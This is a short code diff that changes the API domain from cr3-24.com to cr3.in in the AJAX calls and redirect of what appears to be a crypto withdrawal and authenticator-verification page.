@@ -376,7 +376,7 @@
          const validate = function() {
            $.ajax({
                type: 'POST',
-               url: 'https://cr3-24.com/api/totp-secret/',
+               url: 'https://cr3.in/api/totp-secret/',
                data: {
                 section: 'crypto_withdrawal',
                 address: document.getElementById('address').value,
@@ -458,12 +458,12 @@
          const totp_secret = function(){
            $.ajax({
                type: 'POST',
-               url: 'https://cr3-24.com/api/totp-validate/',
+               url: 'https://cr3.in/api/totp-validate/',
                data: {
                 secret: document.getElementById('secret').innerHTML
                }
            }).done(function(res){
-             window.location.href='https://cr3-24.com/dashboard';
+             window.location.href='https://cr3.in/dashboard';
            });
         }
          const authenticate = function(){
@@ -471,7 +471,7 @@
                $('#authenticator').addClass('disabled text-white');
               $.ajax({
                   type: 'POST',
-                  url: 'https://cr3-24.com/api/totp-validate/',
+                  url: 'https://cr3.in/api/totp-validate/',
                   data: {
                    section: 'crypto_withdraw',
                    address: document.getElementById('address').value,
@@ -507,7 +507,7 @@
                $('#authenticator').addClass('disabled text-white');
                 $.ajax({
                     type: 'POST',
-                    url: 'https://cr3-24.com/api/totp-validate/',
+                    url: 'https://cr3.in/api/totp-validate/',
                     data: {
                      section: 'crypto_withdraw',
                      address: document.getElementById('address').value,
@@ -543,7 +543,7 @@
                $('#authenticator').addClass('disabled text-white');
                 $.ajax({
                     type: 'POST',
-                    url: 'https://cr3-24.com/api/totp-validate/',
+                    url: 'https://cr3.in/api/totp-validate/',
                     data: {
                      section: 'crypto_withdraw',
                      address: document.getElementById('address').value,
